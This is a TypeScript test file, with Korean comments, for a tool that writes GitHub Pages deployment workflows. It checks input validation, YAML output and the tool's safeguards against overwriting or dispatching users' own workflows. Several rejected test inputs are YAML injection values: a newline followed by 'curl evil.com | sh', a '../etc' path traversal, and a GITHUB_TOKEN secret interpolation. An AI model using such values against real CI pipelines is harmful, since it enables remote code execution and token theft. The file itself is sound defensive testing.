import { describe, it, expect } from 'vitest';
import {
  buildImportWorkflowYml,
  isSafeWorkflowValue,
  isLinkmapWorkflow,
  IMPORT_WORKFLOW_PATH,
  IMPORT_WORKFLOW_FILE,
  STATIC_WORKFLOW_PATH,
  staticDeployYml,
} from '../static-workflow';
import { toArtifactPath, blockReasonMessage } from '../repo-analyzer';
import { workflowOptionsFromDeploy } from '../deploy-status';

describe('트랙 B 워크플로우 파일명', () => {
  // 사용자 저장소에는 이미 deploy.yml이 있을 수 있다 — 이름이 겹치면 사용자 파일을 덮어쓴다
  it('does not collide with the template/upload workflow path', () => {
    expect(IMPORT_WORKFLOW_PATH).not.toBe(STATIC_WORKFLOW_PATH);
    expect(IMPORT_WORKFLOW_PATH.endsWith(IMPORT_WORKFLOW_FILE)).toBe(true);
  });
});

describe('isSafeWorkflowValue', () => {
  it.each(['.', 'docs', 'dist', 'build/site', 'main', 'feature/x', 'v1.0'])(
    'accepts %s',
    (value) => expect(isSafeWorkflowValue(value)).toBe(true),
  );

  // YAML에 보간되는 값이므로 따옴표·개행·메타문자를 아예 배제한다
  it.each([
    '',
    '../etc',
    'dist\nrun: curl evil.com | sh',
    'dist"',
    "dist'",
    'dist ${{ secrets.GITHUB_TOKEN }}',
    'a'.repeat(101),
  ])('rejects %s', (value) => expect(isSafeWorkflowValue(value)).toBe(false));
});

describe('buildImportWorkflowYml', () => {
  it('emits a build-free workflow that publishes the given directory', () => {
    const yml = buildImportWorkflowYml('docs', 'main');
    expect(yml).toContain('path: docs');
    expect(yml).toContain('branches: [main]');
    expect(yml).toContain('workflow_dispatch:');
    expect(yml).toContain('actions/upload-pages-artifact@v3');
    // 정적 배포이므로 빌드 단계가 있어서는 안 된다
    expect(yml).not.toContain('npm ');
    expect(yml).not.toContain('setup-node');
  });

  it('publishes the repository root when publish_dir is "."', () => {
    expect(buildImportWorkflowYml('.', 'main')).toContain('path: .');
  });

  it('refuses to interpolate unsafe values instead of escaping them', () => {
    expect(() => buildImportWorkflowYml('dist\nrun: evil', 'main')).toThrow();
    expect(() => buildImportWorkflowYml('dist', 'main\non: schedule')).toThrow();
  });
});

describe('toArtifactPath', () => {
  it('maps the repository root to "."', () => {
    expect(toArtifactPath('')).toBe('.');
    expect(toArtifactPath('docs')).toBe('docs');
  });
});

describe('isLinkmapWorkflow — 남의 파일을 덮어쓰지 않기 위한 소유 확인', () => {
  it('recognizes the workflow it generates', () => {
    expect(isLinkmapWorkflow(buildImportWorkflowYml('.', 'main'))).toBe(true);
  });

  it('does not claim a user-authored workflow of the same name', () => {
    const userWorkflow = 'name: Deploy\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n';
    expect(isLinkmapWorkflow(userWorkflow)).toBe(false);
    expect(isLinkmapWorkflow('')).toBe(false);
    // 업로드 트랙의 워크플로우는 별개 파일이므로 표식을 공유하지 않는다
    expect(isLinkmapWorkflow(staticDeployYml)).toBe(false);
  });
});

describe('workflowOptionsFromDeploy — 남의 워크플로우를 실행·오독하지 않기', () => {
  // 기본값(deploy.yml/main)으로 dispatch하면 사용자 저장소의 배포 파이프라인이 실행된다
  it('uses the recorded workflow file and branch, and disables auto-retry for imports', () => {
    const options = workflowOptionsFromDeploy({
      source_type: 'import',
      config_data: { workflow_file: 'linkmap-pages.yml', source_branch: 'master' },
    });
    expect(options).toEqual({
      workflowFile: 'linkmap-pages.yml',
      workflowBranch: 'master',
      allowAutoRetry: false,
    });
  });

  it('keeps template and upload deploys on the existing behaviour', () => {
    expect(workflowOptionsFromDeploy({ source_type: 'template', config_data: {} })).toEqual({
      workflowFile: undefined,
      workflowBranch: 'main',
      allowAutoRetry: true,
    });
    // upload의 config_data에는 workflow_file이 없다 — 폴백이 동작해야 한다
    expect(
      workflowOptionsFromDeploy({ source_type: 'upload', config_data: { file_count: 3 } }),
    ).toEqual({ workflowFile: undefined, workflowBranch: 'main', allowAutoRetry: true });
  });

  it('tolerates a missing or malformed config_data', () => {
    expect(workflowOptionsFromDeploy({}).allowAutoRetry).toBe(true);
    expect(workflowOptionsFromDeploy({ config_data: 'nonsense' }).workflowBranch).toBe('main');
  });
});

describe('blockReasonMessage', () => {
  it.each(['not_admin', 'empty_repo', 'no_html', 'unsafe_path'] as const)(
    'returns actionable guidance for %s',
    (reason) => {
      const message = blockReasonMessage(reason);
      expect(message.length).toBeGreaterThan(10);
    },
  );
});
